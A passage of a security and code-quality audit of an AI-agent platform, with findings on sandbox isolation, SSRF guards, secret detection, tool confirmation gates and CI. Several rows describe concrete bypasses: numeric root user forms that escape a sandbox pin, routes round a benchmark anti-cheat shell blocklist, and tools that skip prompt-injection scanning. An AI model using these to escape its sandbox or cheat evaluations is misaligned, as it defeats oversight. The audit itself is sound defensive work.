| W1-6 | medium | providers/anthropic billing | `packages/maverick-core/maverick/providers/anthropic_provider.py:544` | All Anthropic cache-write tokens are billed at the 1h (2.0x) surcharge although the message-tier breakpoints are written at 5m (1.25x); usage.cache_creation TTL split is ignored | Read usage.cache_creation.ephemeral_5m_input_tokens / ephemeral_1h_input_tokens when present and bill each bucket at its own multiplier (fall back to the current heuristic only when the split is absent); extend Budget.record_tokens to accept the two counts. Mirror in llm._response_call_cost. Update the FEATURES.md caching paragraph to say system/tools=1h, messages=5m. |
| W1-4 | medium | providers/anthropic prompt caching | `packages/maverick-core/maverick/providers/anthropic_provider.py:122` | Prompt-cache minimum table is wrong for the default models (4096 vs 1024 for Opus 4.8 & Sonnet 4.6, 2048 for Opus 4.7); prewarm is skipped and the wrong value is test-locked | Replace the prefix list with a per-family table matching the published minimums (512: opus-5/sonnet-5/fable; 1024: opus-4-8, sonnet-4-6, sonnet-4-5; 2048: opus-4-7; 4096: opus-4-6, opus-4-5, haiku-4-5) and fix test_opus_48_models.py::test_opus_48_uses_4x_min_cache_threshold. Better: drop the estimate gate and let usage.cache_creation_input_tokens tell you whether the warm took. |
| W1-7 | medium | providers/openai translator | `packages/maverick-core/maverick/providers/openai_provider.py:279` | OpenAI-family translator stringifies image/document blocks: vision via openai/gemini/xai/azure sends base64 as prompt text | In _to_openai_messages emit OpenAI content-part arrays: image blocks -> {'type':'image_url','image_url':{'url':f'data:{media_type};base64,{data}'}} (or the url source verbatim); document blocks -> reject with a clear error for providers without file input. Add a translator test with an image block asserting no base64 lands in a text part. |
| W1-8 | medium | providers/openai_compatible | `packages/maverick-core/maverick/providers/openai_provider.py:167` | openai_compatible provider cannot be used without an API key, contradicting its own docstring (LM Studio / llama.cpp are key-less) | For openai_compatible, when no key is configured use a placeholder (e.g. 'no-auth', matching tgi/vllm) for loopback/private-network base_urls, or add `[providers.openai_compatible] auth = "none"`; keep the refusal only for public https hosts. Also note openai_compatible is absent from the '13 providers' list in docs/FEATURES.md:2565. |
| W5-77 | medium | repo/devcontainer | `.devcontainer/post-create.sh:24` | Three divergent bootstrap recipes; devcontainer bootstrap omits pytest-xdist, pre-commit, detect-secrets and never applies the CI constraint file | Make post-create.sh the single source of truth: `export PIP_CONSTRAINT=requirements/ci.txt` at the top, add `pytest-xdist pytest-timeout pre-commit detect-secrets` to the dev-tool install line, run `pre-commit install` at the end, and have CONTRIBUTING/AGENTS reference the script instead of restating (and mis-stating) it. |
| W5-81 | medium | repo/devcontainer | `.devcontainer/devcontainer.json:3` | Devcontainer pins Python 3.12 while the CI floor is 3.10 — the tomllib class of break that cost three PRs is invisible locally | Use `mcr.microsoft.com/devcontainers/python:3.10` (the floor) as the devcontainer image, or add a `uv python install 3.10` + `uv run --python 3.10 -m pytest --co -q` collection smoke to pre-push-lint.sh so import-time 3.10 breaks are caught locally. |
| W5-76 | medium | repo/onboarding | `CONTRIBUTING.md:15` | CONTRIBUTING quick-start cannot work as written (wrong dir, bare pytest, missing packages, incomplete [dev] extra) | Fix `cd Lightwork`; add evolve + knowledge to the --no-deps list (or point at `.devcontainer/post-create.sh` as the single recipe); replace `pytest -q` with `python3 -m pytest -q -n auto --dist loadfile`; add pytest-xdist, pytest-timeout, vulture, detect-secrets, 'pyjwt[crypto]', cffi, build to the core `[dev]` extra so the 'one shot' claim is true; make docs/CONTRIBUTING.md a symlink or a one-line pointer. |
| W5-78 | medium | repo/pre-commit | `.pre-commit-config.yaml:1` | pre-commit config claims to mirror the CI lint job but runs 2 of its 21 gates with an unpinned ruff | Switch the ruff hook to the official `astral-sh/ruff-pre-commit` repo pinned to v0.16.4 (or `entry: python -m ruff check .` with ruff pinned via the constraint file); add a vulture hook (`python -m vulture`) and a pre-push stage hook that calls `scripts/pre-push-lint.sh` so the contract gates run before push; install pre-commit in post-create.sh and run `pre-commit install --hook-type pre-commit --hook-type pre-push`. |
| W5-79 | medium | repo/scripts | `scripts/pre-push-lint.sh:123` | scripts/pre-push-lint.sh says it mirrors the CI lint job but omits 11 of the contract gates (reachability, egress, dispatch, audit, migration governance, evaluator anchors, soak ...) | Generate the gate list from one place: move the `python -m maverick.<gate> --ci` list into a small manifest (e.g. `scripts/ci_gates.txt`) consumed by both ci.yml (a loop step) and pre-push-lint.sh, and add a test in test_release_packaging.py that every `run: python -m maverick.*--ci` step in ci.yml's lint job appears in the script. |
| W2-37 | medium | safety/secret_detector | `packages/maverick-core/maverick/safety/secret_detector.py:39` | Secret detector misses AWS session/temporary keys (ASIA) despite advertising AWS coverage | Add `\bASIA[0-9A-Z]{16}\b` to secret_detector and output_policy; add an aws_session_token pattern (base64-ish, contextual `aws_session_token`/`x-amz-security-token`). Reconcile output_policy._SECRET_PATTERNS with secret_detector so the answer-side leak detector covers the same providers (github_pat_ fine-grained, gitlab, twilio, db-connection URIs). |
| W1-123 | medium | safety/tool_risk | `packages/maverick-core/maverick/safety/tool_risk.py:279` | 170 default-registered tools have no risk classification and silently inherit 'medium', including hardware/host-mutating ones, so a max_risk='medium' channel ceiling keeps them | Add explicit entries for embedded_device, aria_navigate, a11y, ffmpeg, imagemagick, pandoc, diagram, latex, office_convert, cache_admin, saas_trigger, key_rotation, s3_attachments, transcribe_audio, speak, view_video (high) and classify the pure calculators low; add a CI test that every name registered by base_registry() satisfies tool_risk_is_classified(). |
| W1-88 | medium | sandbox/devcontainer | `packages/maverick-core/maverick/sandbox/devcontainer.py:240` | Devcontainer remoteUser "0", "0:0" or "root:root" bypasses the allow_root pin and runs the agent as root against the writable host mount | Normalise remote_user: split on ':', treat '0' / 'root' (case-insensitive) for either uid or gid as root and route through container_user_args(self.allow_root); also reject non-[A-Za-z0-9_.:-] values. Add tests for '0', '0:0', 'root:root'. |
| W1-91 | medium | sandbox/env-scrub | `packages/maverick-core/maverick/sandbox/local.py:23` | scrub_env substring regex over-strips benign variables (GIT_AUTHOR_*, CURL_CA_BUNDLE, SSH_AUTH_SOCK, XAUTHORITY, TOKENIZERS_PARALLELISM, PGCONNECT_TIMEOUT) and breaks git identity / TLS / ssh-agent in every tool subprocess | Anchor the regex on word/segment boundaries (e.g. r'(?:^\|_)(KEY\|TOKEN\|...)(?:_\|$)') and add an explicit allowlist of known-benign names (GIT_AUTHOR_*, GIT_COMMITTER_*, CURL_CA_BUNDLE, SSL_CERT_*, TOKENIZERS_PARALLELISM, PGCONNECT_TIMEOUT, XAUTHORITY); decide SSH_AUTH_SOCK deliberately (document if intentionally stripped). Add regression tests for each name. |
| W1-95 | medium | sandbox/pool | `packages/maverick-core/maverick/sandbox/pool.py:275` | cross_run_pool is dead: park_at_run_end has no production caller, so the pool never holds an entry while FEATURES.md says runs park their sandbox | Call maverick.sandbox.pool.park_at_run_end(sandbox) from the agent/orchestrator run-teardown path (where the sandbox is closed) or delete the acquire wiring + knob and the FEATURES claim. Add an integration test that a second build_sandbox after a run reuses the parked handle. |
| W5-60 | medium | sdks/plugin-ts | `sdks/plugin-ts/package.json:19` | TypeScript plugin SDK has a working test suite that CI never runs | Add a `plugin-ts` job (setup-node 22, `npm ci`, `npm test`) to ci.yml and to the required checks in .github/rulesets/protect-main.json. |
| W5-57 | medium | tests/conftest | `conftest.py:35` | Root conftest HOME redirect makes every subprocess-spawning test depend on packages living in system site-packages (2 of 6 baseline failures + all 24 demo failures) | In conftest.py, before rewriting HOME, pin the original user-site so children inherit it: `import site; os.environ.setdefault("PYTHONUSERBASE", site.getuserbase())` (and/or export the parent's `sys.path` via PYTHONPATH in a shared `fresh_process_env()` helper used by the 48 subprocess tests). Add a comment to the docstring naming the trap. |
| W1-112 | medium | tools/_ssrf | `packages/maverick-core/maverick/tools/_ssrf.py:92` | SSRF guards do not block CGNAT 100.64.0.0/10 (Alibaba Cloud metadata 100.100.100.200, Tailscale) because they rely on ipaddress.is_private | Replace the boolean list with `not ip.is_global` and add an explicit `ipaddress.ip_network('100.64.0.0/10')` membership check (is_global is False for CGNAT but keep the explicit range for clarity); apply in both _ssrf._ip_is_blocked and http_fetch._is_private_ip; add a test for 100.100.100.200. |
| W1-117 | medium | tools/bigquery | `packages/maverick-core/maverick/tools/bigquery_tool.py:69` | bigquery query ignores `jobComplete`; a query that exceeds the API's default 10s wait is reported as 'ok (0 rows)' | Check `data.get('jobComplete') is False` and either poll `GET /projects/{proj}/queries/{jobId}` until complete (bounded) or return an explicit 'ERROR: job still running (jobId=...)'; pass `maxResults=limit` and `timeoutMs` in the request; add a unit test with a fake response lacking rows and jobComplete=false. |
| W1-119 | medium | tools/browser | `packages/maverick-core/maverick/tools/aria_navigate.py:124` | aria_navigate activate/click has no post-navigation SSRF or capability allow_hosts re-check and its snapshot/find read whatever page the shared browser landed on | After activate (and before snapshot/find) call browser._deny_and_close_current_page(page, _parse_allow_hosts(args)); add 'aria_navigate': 'high' to safety/tool_risk._DEFAULT_RISK; add a test with a fake page whose url becomes http://127.0.0.1/ after click. |
| W1-118 | medium | tools/compute | `packages/maverick-core/maverick/tools/compute.py:106` | compute's no-SymPy fallback (the live default) allows unbounded in-process allocation via string/list multiplication | Apply `_ALLOWED_EXPR_RE` (no quotes/brackets) and the Name allowlist to the fallback path too, reject ast.Str/List/Tuple/Dict/Subscript nodes, cap intermediate magnitude, and run eval under a resource/timeout guard; add fuzz cases to tests/test_compute_fuzz.py for `[0]*10**9` and `'a'*10**9`. |
| W1-124 | medium | tools/databricks | `packages/maverick-core/maverick/tools/databricks_tool.py:59` | databricks read-only gate does not check statement separators, unlike the sibling bigquery/database tools | Import has_unconfirmed_statement_separator from .sql_safety and OR it into needs_confirm exactly as bigquery_tool does; add the stacked-statement test case from tests/test_database_tool.py:199 to the databricks tests. |
| W1-114 | medium | tools/email | `packages/maverick-core/maverick/tools/email_tool.py:100` | email tool uses smtplib/imaplib without an SSL context, so TLS certificate verification is disabled and the app password is exposed to MITM | Build `ctx = ssl.create_default_context()` once and pass `context=ctx` to SMTP_SSL(...), starttls(context=ctx) and IMAP4_SSL(host, ssl_context=ctx); add a test asserting the fake SMTP/IMAP classes receive a context whose verify_mode is CERT_REQUIRED. |
| W1-115 | medium | tools/messaging | `packages/maverick-core/maverick/tools/email_tool.py:80` | email.send, discord_bot post/reply/react, anki add_note and calendar create_event fire immediately with no confirm=true dry-run gate in standard mode | Add the standard `if not as_bool(args.get('confirm')): return 'DRY RUN: would send ... Re-run with confirm=true.'` to email send, discord post/reply/react, anki add_note and calendar create_event; add `confirm` to their schemas and extend tests/test_confirm_gate_fails_closed.py to cover them. |
| W1-90 | medium | tools/sandbox_run | `packages/maverick-core/maverick/tools/__init__.py:149` | sandbox_run feeds stdin through a base64 literal in argv — scripts over ~96 KB crash with 'Argument list too long' (code_exec, notebook_exec, wasm_run) | Write the stdin payload to a temp file inside workdir and pipe it (`base64 -d < file \| cmd`), or for host-visible backends pass input= directly; for remote backends chunk with a heredoc. Catch OSError in notebook_exec/wasm_run and return an ERROR string. Add a regression test with a 200 KB stdin. |
| W1-121 | medium | tools/untrusted-content | `packages/maverick-core/maverick/tools/browser.py:473` | browser extract_html and connector-returned third-party content (discord history, email fetch, confluence page_get, dropbox download) skip the prompt-injection scan that extract_text/http_fetch apply | Route extract_html through _scan_fetched (strip hidden unicode, prepend the warning) and add a small `tools.untrusted_text(text)` helper that connectors returning remote user content call before returning; document which tools return untrusted content in their descriptions. |

## Suggested sequence

1. **Week 1, small and severe.** W2-1/W2-2/W2-3/W2-4 (host git), W2-32 (`verdict.blocked`), W2-45 (KEK scrub),
   W2-33 (rule regexes), W5-28 (RDS), W5-27 (demo URL), W1-48/W1-47 (PG signatures). Each is a day or less.
2. **Week 2, parity gates.** Land the three parity tests as CI gates: world-model backend signatures, egress
   wrapped-library set (add `websockets`, Playwright), suite-router auth/tenant guard census. They convert a dozen
   findings into regressions that cannot recur.
3. **Weeks 3–4, kernel and dashboard.** FINAL-marker and domain-role verifier bypasses; Cancel actually cancelling;
   move sync world-model calls in async handlers to `run_in_threadpool` (start with the 469 the finder listed);
   backup key custody and restore guard.
4. **Then the suites.** Consolidate the duplicated helper families into `_shared.py`, bound the evidence ledger's
   re-verification, add abandon/expiry to gateway reservations, fix `unified_audit_records`.
5. **Continuously.** The docs-accuracy list is mechanical; assign it with the docs gate so it stays fixed.
6. **Finish the audit.** Re-run the twenty-five dimensions that did not complete, then the skeptic/refuter stage
   over this whole list. The briefs and workflow script are reproducible (see method notes).

## Improvement opportunities (not defects)

| ID | Area | Location | Opportunity | Proposal | Effort |
|---|---|---|---|---|---|
| W4-43 | core/ai_business_intake | `packages/maverick-core/maverick/ai_business_intake.py:556` | Business intake never proposes an EU AI Act category: eu_ai_act_category is the constant 'undetermined' even when prohibited/high-risk signals were collected | Emit a non-binding `eu_ai_act_candidate_category` (prohibited / high_risk / limited_risk / minimal / undetermined) with the triggering signals as reasons, keep legal_determination False and human_review_required True, and reference the Art. 5 / Annex III lists from ai_act.py so the two modules stay consistent. | S |
| W4-41 | core/ai_cloud_agent_governance | `packages/maverick-core/maverick/ai_cloud_agent_governance.py:467` | Cloud-agent governance ships with process-local canonical authority: enforcement bindings and inventory revisions vanish on restart | Implement a GovernedRecordStore- or SQLite-backed ProviderRevisionAuthority/ProviderResourceRegistry with CAS semantics (mirroring ai_entity_tasks/ai_governance_loop), select it by config, and flip the status flags; until then label the cockpit page 'preview'. | L |
| W2-108 | core/audit/forwarder | `packages/maverick-core/maverick/audit/forwarder.py:32` | SIEM forwarder offers no TLS syslog transport: tcp:// is always plaintext and there is no tls:// / tcp+tls:// scheme | Add a 'tls' (or 'tcp+tls') scheme that wraps _send_tcp's socket with ssl.create_default_context() (optional client cert via [audit] siem_tls_cert/key, CA via siem_tls_ca), fail closed on verification errors, and mention it in the docstring and `maverick audit forward --help`. | S |
| W2-86 | core/cli doctor + config_lint | `packages/maverick-core/maverick/tenant/registry.py:639` | No doctor/config-lint check for the multi-tenant misconfigurations found in this audit | Add a `maverick tenant doctor` (or doctor section) that reports: by_user+roster, by_user+floor, Postgres roster with strict/RLS off, DSN role SUPERUSER/BYPASSRLS, rbac/workspace-selection entries referencing tenants not in the roster, and tenant ids whose encoded segment differs from the raw id. | M |
| W1-21 | core/config provider endpoints | `packages/maverick-core/maverick/config.py:679` | Ollama/Gemini/OpenRouter have no base_url env var (OLLAMA_HOST ignored); only config can repoint them | Add ('OLLAMA_HOST','OLLAMA_BASE_URL') for ollama (append /v1 like tgi/vllm do), OPENROUTER_BASE_URL and GEMINI_BASE_URL, in ONE shared map imported by llm.py and config.py. | S |
| W4-20 | core/consent_delivery_runtime + dashboard | `packages/maverick-core/maverick/consent_delivery_runtime.py:1` | No worker/scheduler drives consent delivery: destinations are only updated when an admin clicks Dispatch | Add a gated dashboard-lifespan delivery supervisor (mirroring consent_scan_scheduler: bounded tenants, interval, lease renewal, sanitized health) and/or `maverick consent deliver --loop`; document manual-only mode otherwise. | M |
| W2-67 | core/crypto_at_rest | `packages/maverick-core/maverick/crypto_at_rest.py:783` | Random 96-bit GCM nonces under a long-lived at-rest key with no usage accounting or rotation cadence guidance | Document a rotation cadence and add a doctor/launch-check row on key age; longer-term use a nonce-misuse-resistant AEAD (AES-GCM-SIV or XChaCha20-Poly1305 via cryptography) for v3 blobs. | M |
| W2-104 | core/enterprise | `packages/maverick-core/maverick/enterprise.py:533` | [enterprise] allowed_hosts is exact-match only: no wildcards, ports, schemes or per-tool scoping, forcing operators to enumerate every SaaS subdomain | Reuse sandbox.network_policy._matches (fnmatch + IDNA canonicalisation) in egress_permitted, support optional ':port', and add an [enterprise.allowed_hosts_by_tool] table; surface the effective allow-list in `maverick doctor` and reject patterns like '*' with a warning. | S |
| W4-79 | core/grc_sync | `packages/maverick-core/maverick/grc_sync.py:257` | GRC sync backlink points every ServiceNow/Archer record at the assurance landing page instead of the source record | Build the backlink from kind + source_id (finding/incident/acceptance routes already exist in model_risk_api/security_api) and cover it in the existing outbound_payload test. | S |
| W3-60 | core/health(doctor) | `packages/maverick-core/maverick/cli/__init__.py:500` | `doctor` has no machine-readable output although it is positioned as the CI/deploy health gate; `preflight` and `launch-check` differ too | Have _row() append to a list of dicts and add `--json` to doctor and launch-check (emit rows + failures + exit semantics); keep text default. | S |
| W3-61 | core/health(doctor) | `packages/maverick-core/maverick/health.py:146` | `doctor` tells the user 'fine unless a [models] role routes to an anthropic model' instead of checking it — preflight already has the route check | Call _routed_configuration_missing in _check_anthropic/_check_openai and render one row per incomplete route (RED) with the exact env var missing; reword the base-URL-only case. | S |
| W4-58 | core/privacy_egress | `packages/maverick-core/maverick/privacy_egress.py:110` | Egress redaction re-runs provable redaction over the entire conversation on every LLM call | Memoise redacted content by (id(msg) or sha256 of the canonical block) in a bounded LRU on the module, or have the agent loop keep a parallel already-redacted history and only redact the newly appended blocks. | S |
| W2-25 | core/proxy_auth | `packages/maverick-core/maverick/proxy_auth.py:86` | trusted_proxies matches peers by exact string only — no CIDR, no IPv4-mapped IPv6 normalization | Parse trusted_proxies with ipaddress.ip_network (accept CIDRs), normalize the peer with ipaddress.ip_address(...).ipv4_mapped, and reject unparsable entries at startup with a clear error. | S |
| W5-67 | core/security tests | `packages/maverick-core/tests/test_parser_fuzz.py:115` | Security parsers are fuzzed only by a hand-rolled, single-seed, 600-sample corpus; no property-based testing and no fuzz for SSRF guard or path-confinement helpers | Add hypothesis (dev extra) with `@given` strategies for URL/path/JSON envelopes; write property tests: confinement never returns a path outside base for any unicode/../symlink input, SSRF guard rejects every RFC1918/loopback/IPv6-mapped literal and DNS-rebind shape, signature verifiers reject any single-byte mutation of a valid envelope. Run 5 seeds in the parser fuzz. | M |
| W2-66 | core/tenant/kms | `packages/maverick-core/maverick/tenant/kms.py:228` | Tenant DEKs are cached for the process lifetime by default, so a revoked cloud-KMS key keeps opening tenant data until restart | Default dek_cache_ttl to a bounded value (e.g. 300-3600 s) when [kms] provider is aws/gcp/vault, keeping 0 for LocalKMS; surface the effective TTL in doctor. | S |
| W4-102 | core/trust_receipt + trc | `packages/maverick-core/maverick/trust_receipt_verify.py:1092` | The standalone auditor verifier (trust_receipt_verify.py, 1,324 lines) and trc_evidence_collectors have no dedicated test modules | Add `test_trust_receipt_verify.py` driving `verify()`/`main()` with hand-built receipts (tampered row, expired key window, mismatched anchor digest, oversized receipt, legacy version) and `test_trc_evidence_collectors.py` for validate_request/validate_page/LocalSoc2Collector. | M |
| W2-29 | dashboard/app (exception handler) | `packages/maverick-dashboard/maverick_dashboard/app.py:2012` | Browser 401s redirect to /auth/login only when OIDC login is configured; SAML-only deployments land on a static 'Sign in required' page | Extend the redirect branch: if not login_on and saml_enabled(): redirect to /saml/login?return_to=...; render a 'sign in' link on error.html when either flow is on. | S |
| W2-30 | dashboard/app (observability auth) | `packages/maverick-dashboard/maverick_dashboard/app.py:10425` | /metrics requires the full admin static bearer or a user session — no scoped scrape credential for Prometheus | Add [dashboard] metrics_token (read-only, only valid for /metrics) and/or a metrics_allow_ips knob plus a wizard step; keep the admin bearer working for backward compatibility. | S |
| W3-17 | dashboard/schedulers | `packages/maverick-dashboard/maverick_dashboard/app.py:557` | 15 background schedulers have two different lifecycle styles and no unified registry or readiness aggregation | Introduce a SchedulerRegistry on app.state with register(name, start, stop, status) used by both styles; start/stop all from one lifespan block; expose the aggregated status on an admin-only /api/v1/admin/schedulers route and a summarized flag in /readyz. | M |
| W3-16 | dashboard/suite-apis (guard enforcement) | `packages/maverick-dashboard/maverick_dashboard/vendor_onboarding_api.py:55` | Route authorization is enforced by per-handler convention (a call inside the body) with no structural or CI guarantee | Adopt router-level `dependencies=[Depends(require_view)]` per APIRouter (with per-route escalation for admin/operate) so the minimum guard is structural, and/or commit an AST gate under scripts/ that fails CI when a non-public route handler cannot reach require_permission/require_global_permission/caller_principal transitively (whitelist the intentionally public routers). | M |
| W5-19 | dependencies/integrity | `requirements/ci.txt:10` | pip installs across CI/release/Docker pin versions but never hashes (`--require-hashes` absent everywhere) | Generate a hashed lock (`pip-compile --generate-hashes` from the current ci.txt, per-marker) and use `--require-hashes` in install_release_cohort.py, the Dockerfile runtime stage and the binaries job; keep ci.txt as the human-reviewed constraint source. | M |
| W5-26 | deploy/github-action | `deploy/github-action/action.yml:60` | No repository automation tests the composite deploy/github-action with a real run, and its default python-version floats | Default `python-version` to the tested `3.12.13`, document consuming the action by full SHA, and add a nightly (schedule) run of the composite action with a real key and a $0.05 cap in an environment-protected job so the non-dry-run path is exercised at least once a day. | S |
| W5-56 | deploy/terraform | `deploy/aws/terraform/ecs.tf:135` | Every prod deploy is a full outage by design (min-healthy 0%) because the control-plane lease forbids rolling updates | Implement a lease handoff protocol in control_plane_lease.py (SIGTERM/handoff request → old writer flushes ledgers and releases → new writer acquires), then raise deployment_minimum_healthy_percent to 100 / maximum to 200 and enable the Helm PDB. Track as a roadmap item and state the current downtime window in docs/deployment.md. | L |
| W3-70 | docs/cli-reference | `docs/handbook.md:174` | 89 of 175 top-level commands are absent from the four primary docs and 17 are not mentioned anywhere under docs/; there is no generated CLI reference | Generate docs/cli.md from the click tree (the audit walker already emits name/help/params JSON) in a `make docs` step, and add a CI check that every `maverick <cmd>` token in docs/ resolves to a real command. | M |
| W5-128 | docs/tooling | `docs/press-kit.md:3` | Generate the headline counts in docs from code instead of hand-editing eleven files | Add `scripts/doc_counts.py` that prints the live counts and a test (`test_docs_counts.py`) asserting each cited literal in the listed files matches; optionally template the numbers via a `{{counts.packs}}` include so the docs cannot drift. | M |
| W1-44 | kernel/agent-loop prompt building | `packages/maverick-core/maverick/agent.py:3413` | Orchestrator reads the blackboard only once (first user turn); later swarm signals never reach the deciding agent | Track a per-agent blackboard cursor; on each turn that runs tools, append a bounded text block of entries posted since the cursor (excluding the agent's own posts and sealed agents), capped by MAVERICK_BB_RENDER_ENTRY_CHARS, as a trailing text block in the tool_results user message (same slot as the step-budget warning at 4397-4406). | M |
| W1-11 | providers/base contract | `packages/maverick-core/maverick/providers/base.py:353` | Provider interface has no tool_choice / strict-tool / disable_parallel_tool_use support | Thread an optional `tool_choice` ({'type':'auto'\|'any'\|'tool'\|'none', 'disable_parallel_tool_use'} in Anthropic vocabulary) and a per-tool `strict` flag through LLM.complete -> providers, translating to OpenAI's tool_choice/strict. Note forced 'any'/'tool' is rejected on Fable 5.1, so clamp to 'auto' + instruction there. Mark non-parallel_safe Tool objects with disable_parallel_tool_use. | M |
| W1-10 | providers/bedrock | `packages/maverick-core/maverick/providers/bedrock_provider.py:31` | Bedrock adapter is bearer-key-only, routes Claude through the OpenAI translator (no caching/thinking/signatures) and ships a dated default model id | Re-implement BedrockClient on top of AnthropicClient using anthropic.AnthropicBedrockMantle / AsyncAnthropicBedrockMantle (aws_region from AWS_REGION, credentials from the default AWS chain), keep the OpenAI-compat bearer path as an explicit `auth_mode = "api_key"` option, map 'anthropic.<id>' ids to the Anthropic rate card for pricing, and update the default model id. | M |
| W5-16 | release/binaries | `.github/workflows/release.yml:276` | PyInstaller release binaries have no reproducibility check and no platform code-signing/notarization | Add a second PyInstaller build with SOURCE_DATE_EPOCH and compare (or document why not reproducible), add Apple Developer ID signing + notarization (`codesign`/`notarytool`) and Windows Authenticode via CI secrets as docs/DISTRIBUTION.md:190-195 already plans, and add a linux-arm64 binary leg (ubuntu-24.04-arm). | M |
| W5-96 | repo/dev-loop | `AGENTS.md:13` | No Makefile/justfile/.editorconfig: the canonical dev commands exist only as prose in three files that disagree | Add a `justfile` (or Makefile) whose targets wrap post-create.sh, the pytest invocation, ruff+vulture and pre-push-lint.sh; reference `just test` from CLAUDE.md/AGENTS.md/CONTRIBUTING; add a root `.editorconfig`. | S |
| W5-85 | repo/lint-config | `pyproject.toml:55` | Ruff rule set leaves cheap real-bug families off; quantified incremental adoption list | Phase 1 (one PR, ~70 fixes): extend select with `ASYNC, DTZ, PLW1508, PLW1509, RUF012, RUF013, PLE2515, LOG, RUF100`. Phase 2: `TRY400, PLW1510, PLW2901` with `--fix`/manual (~240). Phase 3: ratchet `S110`, `PLW0603`, `BLE001`, `S608` via per-file-ignores baseline that only shrinks (same pattern as audit_contract.baseline.json). Keep S101/ANN/D/TRY003/EM/PLC0415/COM812 off and document why in the pyproject comment block. | M |
| W5-93 | repo/root | `CODE_QUALITY_AUDIT.md:1` | Root directory clutter: eight audit/QA reports (≈380 KB) sit beside the README | Move them to `docs/audits/<YYYY-MM>-<name>.md` with a `docs/audits/README.md` index, leave a one-line pointer in CLAUDE.md, and add a `check_root_layout` test that whitelists the allowed root files so reports cannot accumulate again. | S |
| W5-89 | repo/type-checking | `packages/maverick-knowledge/maverick_knowledge/store.py:83` | Type-checking baseline measured: pyright on the three leaf packages yields 158 errors, ~half optional-import noise and zero confirmed bugs in the sample — adopt as advisory only | Add a non-blocking CI step (`continue-on-error: true`) running `pyright packages/maverick-shield packages/maverick-knowledge packages/maverick-mcp` from the repo root with a `pyrightconfig.json` that sets `reportMissingImports: false`, `reportOptionalMemberAccess: "warning"`, `extraPaths` to the package roots; narrow `store.py` by asserting `_conn` once in a `_db()` accessor. Revisit gating only if the advisory run starts catching real regressions. | M |
| W1-107 | sandbox/docker+podman | `packages/maverick-core/maverick/sandbox/docker.py:160` | Docker/podman hardening gaps: no read-only rootfs, --ipc none, --pull=never, ulimits, or seccomp profile; empty-string memory/pids config silently disables caps | Add opt-out --read-only + --tmpfs /tmp, --ipc none, --pull=never (with a pre-pull step in the wizard), --ulimit nofile=4096 and core=0; warn when memory/pids_limit parse to a disabled cap; share the flag builder between DockerBackend, PodmanBackend and the firecracker fallback. | M |
| W1-106 | sandbox/local | `packages/maverick-core/maverick/sandbox/local.py:299` | LocalBackend applies no resource limits at all — fork bombs, memory hogs and huge files hit the host unbounded on the default backend | Add [sandbox] local_limits (pids, memory_mb, fsize_mb) applied via preexec_fn=lambda: resource.setrlimit(...) on POSIX (Job Object limits already exist on Windows via _ExtendedLimitInformation — set ProcessMemoryLimit/ActiveProcessLimit there). Wire a wizard step per kernel rules 5-6. | S |
| W1-138 | tools/_rest_connector | `packages/maverick-core/maverick/tools/_rest_connector.py:283` | _rest_execute collapses every upstream 4xx into 'upstream request failed', hiding validation errors the agent needs to self-correct | Extract a small allowlisted, length-capped set of JSON fields from the error body (message/detail/code/errors[].message), run them through safety.redact, and append them to the ERROR string; keep raw text bodies suppressed. | S |
| W1-137 | tools/connectors | `packages/maverick-core/maverick/tools/_rest_connector.py:259` | Hand-written SaaS connectors bypass the capability allow_hosts egress scope and SSRF pinning that make_rest_tool enforces; unify them on the factory | Re-express the hand-written connectors as thin op-maps over make_rest_tool/_rest_execute (fixed base URL + path templates with `_path_segment`-encoded ids), so they inherit egress scope, pinning, connection-scoped credentials and redaction and can be removed from the ambient-credential deny list; keep the friendly op schemas as a layer above the factory. | L |

## Prior-audit items still open at HEAD

Items the finder flagged as already reported in an earlier audit document and still present at HEAD (the finder's reading; not independently re-verified).

| ID | Sev | Prior reference | Location | Finding |
|---|---|---|---|---|
| W2-90 | high | ADVERSARY_COUNCIL_REVIEW.md #3 'airgap check trusts the provider name, not the resolved URL' (provider part fixed; enterprise-mode/egress-plane mismatch not covered) | `packages/maverick-core/maverick/air_gap.py:88` | `maverick airgap check` can report 'clean' while the process-wide egress guard is off: it checks [egress] deny=['*'] (enforced by ~15 modules) but never [enterprise] mode, which is what egress_guard actually enforces |
| W1-88 | medium | ADVERSARY_COUNCIL_REVIEW.md #5 'Devcontainer sandbox ships weaker isolation' (fixed for the literal 'root' only; numeric/uid:gid forms still bypass) | `packages/maverick-core/maverick/sandbox/devcontainer.py:240` | Devcontainer remoteUser "0", "0:0" or "root:root" bypasses the allow_root pin and runs the agent as root against the writable host mount |
| W1-91 | medium | STRESS_TEST.md 'Finding 1 — scrub_env() corrupts git's env-config injection' (GIT_CONFIG_* fixed; other over-strips remain) | `packages/maverick-core/maverick/sandbox/local.py:23` | scrub_env substring regex over-strips benign variables (GIT_AUTHOR_*, CURL_CA_BUNDLE, SSH_AUTH_SOCK, XAUTHORITY, TOKENIZERS_PARALLELISM, PGCONNECT_TIMEOUT) and breaks git identity / TLS / ssh-agent in every tool subprocess |
| W1-93 | medium | CODE_QUALITY_AUDIT.md row 'tools/shell.py:97-103 Benchmark anti-cheat git/secret blocklist is self-admittedly bypassable' | `packages/maverick-core/maverick/tools/shell.py:102` | Opaque-benchmark shell blocklist is bypassed by git revert/checkout/reset/restore, .git/logs/HEAD via head/grep/python, split tokens and variable indirection |
| W2-15 | medium | CODE_QUALITY_AUDIT.md — saml.py:21-24 'SAML browser-SSO auth path ships disclosed as untested against any live IdP' (this is a concrete consequence of that gap; still present at HEAD) | `packages/maverick-dashboard/maverick_dashboard/saml.py:171` | SAML config allows want_assertions_signed=false while want_response_signed is hard-coded False, so a misconfiguration accepts unsigned assertions |
| W2-18 | medium | FIXES.md — 'CSP unsafe-inline nonce migration is the remaining (open eng) half' (line 57) | `packages/maverick-dashboard/maverick_dashboard/app.py:1172` | CSP still allows 'unsafe-inline' scripts on every dashboard page (nonce migration open) |
| W2-53 | medium | ADVERSARY_COUNCIL_REVIEW.md — Critical #1 'The signed, tamper-evident learning audit is self-signed with a co-located key by default' | `packages/maverick-core/maverick/audit/signing.py:471` | Off-host audit key custody is still opt-in outside enterprise mode; default install signs with a co-located key while README still headlines 'Tamper-evident' |
| W2-102 | medium | ADVERSARY_COUNCIL_REVIEW.md #6 'Air-gap audit is blind to every telemetry/forwarding sink' (config path fixed; env path still blind) | `packages/maverick-core/maverick/air_gap.py:161` | Air-gap telemetry audit sees only config: MAVERICK_SENTRY_DSN / MAVERICK_OTEL_EXPORTER env (which observability.py prefers) pass clean, and those exporters use urllib3/grpc stacks the egress guard cannot stop |
